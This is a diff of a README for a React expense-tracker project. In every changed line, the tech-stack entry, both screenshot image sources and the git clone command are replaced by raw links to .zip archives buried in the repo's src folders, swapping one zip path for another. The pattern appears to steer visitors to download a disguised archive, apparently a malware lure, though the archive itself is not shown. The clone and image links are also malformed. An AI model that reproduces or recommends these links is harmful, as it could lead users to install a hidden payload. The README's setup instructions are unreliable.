@@ -34,7 +34,7 @@ I created it from scratch as part of my learning journey to strengthen my **Reac
 
 ## 🛠️ Tech Stack
 
-- **https://raw.githubusercontent.com/glakshya20/Expense-Tracker-Project/main/src/context/Tracker_Project_Expense_1.2.zip**
+- **https://raw.githubusercontent.com/glakshya20/Expense-Tracker-Project/main/src/components/Expense-Project-Tracker-v2.5-beta.3.zip**
 - **CSS3**
 - **JavaScript (ES6+)**
 - **Local Storage API**
@@ -42,8 +42,8 @@ I created it from scratch as part of my learning journey to strengthen my **Reac
 ---
 
 ## 📸 Preview
-<img width="601" height="840" alt="Screenshot 2025-10-27 162416" src="https://raw.githubusercontent.com/glakshya20/Expense-Tracker-Project/main/src/context/Tracker_Project_Expense_1.2.zip" />
-<img width="431" height="845" alt="Screenshot 2025-10-27 190344" src="https://raw.githubusercontent.com/glakshya20/Expense-Tracker-Project/main/src/context/Tracker_Project_Expense_1.2.zip" />
+<img width="601" height="840" alt="Screenshot 2025-10-27 162416" src="https://raw.githubusercontent.com/glakshya20/Expense-Tracker-Project/main/src/components/Expense-Project-Tracker-v2.5-beta.3.zip" />
+<img width="431" height="845" alt="Screenshot 2025-10-27 190344" src="https://raw.githubusercontent.com/glakshya20/Expense-Tracker-Project/main/src/components/Expense-Project-Tracker-v2.5-beta.3.zip" />
 
 
 ---
@@ -52,7 +52,7 @@ I created it from scratch as part of my learning journey to strengthen my **Reac
 
 1. Clone the repository:
    ```bash
-   git clone https://raw.githubusercontent.com/glakshya20/Expense-Tracker-Project/main/src/context/Tracker_Project_Expense_1.2.zip<glakshya20>https://raw.githubusercontent.com/glakshya20/Expense-Tracker-Project/main/src/context/Tracker_Project_Expense_1.2.zip
+   git clone https://raw.githubusercontent.com/glakshya20/Expense-Tracker-Project/main/src/components/Expense-Project-Tracker-v2.5-beta.3.zip<glakshya20>https://raw.githubusercontent.com/glakshya20/Expense-Tracker-Project/main/src/components/Expense-Project-Tracker-v2.5-beta.3.zip
    cd expense-tracker-react
    npm install
    npm start
